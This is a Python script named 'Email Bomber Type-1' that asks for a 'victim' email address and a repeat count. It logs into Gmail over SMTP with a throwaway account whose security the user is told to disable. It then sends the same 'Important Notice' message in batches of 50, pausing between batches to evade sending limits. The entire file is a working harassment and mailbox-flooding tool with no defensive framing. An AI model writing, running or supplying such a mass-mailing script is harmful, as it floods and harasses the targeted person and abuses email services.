
import smtplib

from string import Template

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time

print("**********Welcome to Email Bomber Type-1 **************")

print("Please create a fake gmail ID and disable its security to work properly")
# print("Create a file 'mycontacts.txt' and enter name and email id in the format shown below")
# print("name name@mail.com")
print("-----------------------")

message_template = '''Dear ${PERSON_NAME}, 

This is a test message. 
Have a great weekend! 

Yours Truly'''
print("Create a file 'message.txt' and enter content similar to below format ")
print(message_template)
print("=====================\n\n\n")


MY_ADDRESS = str(input("Enter Your email id : "))
PASSWORD = input("Enter Your password: ")


def get_contacts(filename):
    """
    Return two lists names, emails containing names and email addresses
    read from a file specified by filename.
    """
    
    names = []
    emails = []
    with open(filename, mode='r', encoding='utf-8') as contacts_file:
        for a_contact in contacts_file:
            names.append(a_contact.split()[0])
            emails.append(a_contact.split()[1])
    return names, emails

def read_template(filename):
    """
    Returns a Template object comprising the contents of the 
    file specified by filename.
    """
    
    with open(filename, 'r', encoding='utf-8') as template_file:
        template_file_content = template_file.read()
    return Template(template_file_content)


# def get_host():
#     smtp_provider = input("select your email provider\n1)GMAIL\n2)OUTLOOK")

def send_email(email,password,msg,batch):
    print("System Restarted..........")
    print("Sending batch number {}".format(batch))
    s = smtplib.SMTP(host='smtp.gmail.com', port=587)
    s.starttls()
    try:
        s.login(email, password)
        print("Login Successfull!!!!!")
        print("------------------------")
    except Exception as e:
        print("Login failed Please disable security and enter correct email and password")
        exit(0)
    progress = 0
    print("sending 50 mails in batch")
    while progress<50:
        progress += 1
        print("{} mail of 50 mail sent".format(progress))
        try:
            s.send_message(msg)
            # print("{} message sent".format(progress))
        except Exception as e:
            print("{} message sending failed due to {}".format(progress,e))
            # s.quit()
            return
    s.quit()

    print("------------------------------------------------------------")
    print("50 Message Successfully sent to {}".format(msg['To']))
    del msg

def main():
    names, emails = get_contacts('mycontacts.txt') # read contacts
    message_template = read_template('message.txt')

    # set up the SMTP server
    
    name = input("Enter the name of victim: ")
    email = input("Enter victims Email: ")
    count = int(input("Enter Number of times to send: "))
    # For each contact, send the email:
    # for name, email in zip(names, emails):
    msg = MIMEMultipart()       # create a message

    # add in the actual person name to the message template
    message = message_template.substitute(PERSON_NAME=name)

    # Prints out the message body for our sake
    #print(message)

    # setup the parameters of the message
    msg['From']=MY_ADDRESS
    msg['To']=email
    msg['Subject']= "Important Notice"
    
    # add in the message body
    msg.attach(MIMEText(message, 'plain'))
    
    # send the message via the server set up earlier.
    # progress = 0
    count = count/50
    new_count = count +1
    while count>=0:
        send_email(MY_ADDRESS,PASSWORD,msg,new_count-count)
        count -= 1
        print("\n\n Please wait System is restarting for Security Purpose")
        print("\n Waiting time 1 minute \n\n\n")
        time.sleep(60)
    
        
    # Terminate the SMTP session and close the connection
    
    
if __name__ == '__main__':
    main()